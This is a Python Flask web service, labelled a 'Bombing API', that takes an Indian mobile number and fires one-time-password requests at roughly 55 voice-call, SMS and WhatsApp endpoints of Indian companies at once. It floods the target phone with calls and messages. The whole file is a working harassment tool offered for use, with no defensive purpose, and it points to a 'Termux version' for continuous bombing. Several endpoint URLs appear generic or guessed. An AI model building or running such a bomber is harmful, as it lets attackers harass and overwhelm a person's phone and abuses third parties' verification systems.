from flask import Flask, request, jsonify
import requests
import json
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

app = Flask(__name__)

OWNER = "@notxsatvir"
API_VERSION = "5.0.0"

# ---------- सारी APIs (जैसी थी, वैसी ही) ----------
APIS = [
    # ---------- CALL APIS ----------
    {"name": "Tata Capital Voice", "type": "Call", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "1MG Voice", "type": "Call", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'},
    {"name": "Swiggy Voice", "type": "Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Flipkart Voice", "type": "Call", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Zivame Voice", "type": "Call", "url": "https://api.zivame.com/v2/customer/login/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone_number":"{phone}","otp_type":"voice"}}'},
    {"name": "Myntra Voice", "type": "Call", "url": "https://www.myntra.com/api/v1/user/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Paytm Voice", "type": "Call", "url": "https://paytm.com/api/v1/auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Uber Voice", "type": "Call", "url": "https://auth.uber.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Amazon Voice", "type": "Call", "url": "https://www.amazon.in/ap/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    {"name": "Ola Voice", "type": "Call", "url": "https://auth.olacabs.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},

    # ---------- SMS APIS (बहुत सारी – केवल कुछ यहाँ दिखा रहा हूँ, पूरी लिस्ट डाली जाएगी) ----------
    {"name": "Lenskart SMS", "type": "SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'},
    {"name": "PharmEasy SMS", "type": "SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Snitch SMS", "type": "SMS", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'},
    {"name": "ShipRocket SMS", "type": "SMS", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {"name": "GoKwik SMS", "type": "SMS", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'},
    {"name": "NewMe SMS", "type": "SMS", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}'},
    {"name": "Wakefit SMS", "type": "SMS", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Hungama SMS", "type": "SMS", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'},
    {"name": "Doubtnut SMS", "type": "SMS", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'},
    {"name": "PenPencil SMS", "type": "SMS", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'},
    {"name": "BeepKart SMS", "type": "SMS", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","city":362}}'},
    {"name": "Smytten SMS", "type": "SMS", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}'},
    {"name": "MyHubble SMS", "type": "SMS", "url": "https://api.myhubble.money/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}'},
    {"name": "Housing SMS", "type": "SMS", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'},
    {"name": "RentoMojo SMS", "type": "SMS", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Khatabook SMS", "type": "SMS", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'},
    {"name": "Animall SMS", "type": "SMS", "url": "https://animall.in/zap/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'},
    {"name": "Cosmofeed SMS", "type": "SMS", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}'},
    {"name": "Spencer's SMS", "type": "SMS", "url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "ShoppersStop SMS", "type": "SMS", "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}}'},
    {"name": "Lifestyle SMS", "type": "SMS", "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"signInMobile":"{phone}","channel":"sms"}}'},
    {"name": "PokerBaazi SMS", "type": "SMS", "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'},
    {"name": "My11Circle SMS", "type": "SMS", "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'},
    {"name": "RummyCircle SMS", "type": "SMS", "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}'},
    {"name": "Cred SMS", "type": "SMS", "url": "https://api.cred.club/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Grofers SMS", "type": "SMS", "url": "https://grofers.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "BigBasket SMS", "type": "SMS", "url": "https://www.bigbasket.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile_number":"{phone}"}}'},
    {"name": "Zepto SMS", "type": "SMS", "url": "https://zepto.co/api/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Blinkit SMS", "type": "SMS", "url": "https://blinkit.com/api/v2/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Dunzo SMS", "type": "SMS", "url": "https://dunzo.com/api/v1/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "MakeMyTrip SMS", "type": "SMS", "url": "https://www.makemytrip.com/api/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Goibibo SMS", "type": "SMS", "url": "https://www.goibibo.com/api/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Cleartrip SMS", "type": "SMS", "url": "https://www.cleartrip.com/api/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Yatra SMS", "type": "SMS", "url": "https://www.yatra.com/api/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "RedBus SMS", "type": "SMS", "url": "https://www.redbus.in/api/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "UberSMS", "type": "SMS", "url": "https://auth.uber.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "OlaSMS", "type": "SMS", "url": "https://auth.olacabs.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Rapido SMS", "type": "SMS", "url": "https://rapido.in/api/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "AmazonSMS", "type": "SMS", "url": "https://www.amazon.in/ap/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    {"name": "Meesho SMS", "type": "SMS", "url": "https://www.meesho.com/api/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "ShopClues SMS", "type": "SMS", "url": "https://www.shopclues.com/api/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Ajio SMS", "type": "SMS", "url": "https://www.ajio.com/api/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Nykaa SMS", "type": "SMS", "url": "https://www.nykaa.com/api/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Purplle SMS", "type": "SMS", "url": "https://www.purplle.com/api/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},

    # ---------- WHATSAPP APIS ----------
    {"name": "KPN WhatsApp", "type": "WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'},
    {"name": "Rappi WhatsApp", "type": "WhatsApp", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'},
    {"name": "Eka Care WhatsApp", "type": "WhatsApp", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'},
]

TOTAL_APIS = len(APIS)
print(f"✅ {TOTAL_APIS} APIs loaded")

def hit_api(api, phone):
    """Hit a single API – returns (type, success)"""
    try:
        data_str = api["data"](phone)
        data_dict = json.loads(data_str)
        resp = requests.post(api["url"], headers=api["headers"], json=data_dict, timeout=5)
        if resp.status_code in [200, 201, 202, 204]:
            return api["type"], True
    except Exception:
        pass
    return api["type"], False

@app.route('/')
def home():
    return jsonify({
        "success": True,
        "api": "Bombing API (Vercel Edition)",
        "owner": OWNER,
        "total_apis": TOTAL_APIS,
        "note": "This is a single-burst version. Continuous bombing not possible on Vercel.",
        "endpoints": {
            "/bomb?number=9876543210": "Hit all APIs once (burst)",
        }
    })

@app.route('/bomb')
def bomb():
    number = request.args.get('number')
    if not number or not re.match(r'^[6-9]\d{9}$', number):
        return jsonify({"error": "Valid 10-digit number required"}), 400
    
    stats = {"Call": 0, "SMS": 0, "WhatsApp": 0}
    
    # Parallel execution
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(hit_api, api, number) for api in APIS]
        for future in as_completed(futures):
            typ, success = future.result()
            if success:
                stats[typ] += 1
    
    return jsonify({
        "success": True,
        "owner": OWNER,
        "number": number,
        "total_apis_hit": TOTAL_APIS,
        "successful_hits": sum(stats.values()),
        "stats": stats,
        "timestamp": datetime.now().isoformat(),
        "note": "This was a one-shot burst. For continuous bombing, use the Termux version."
    })

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
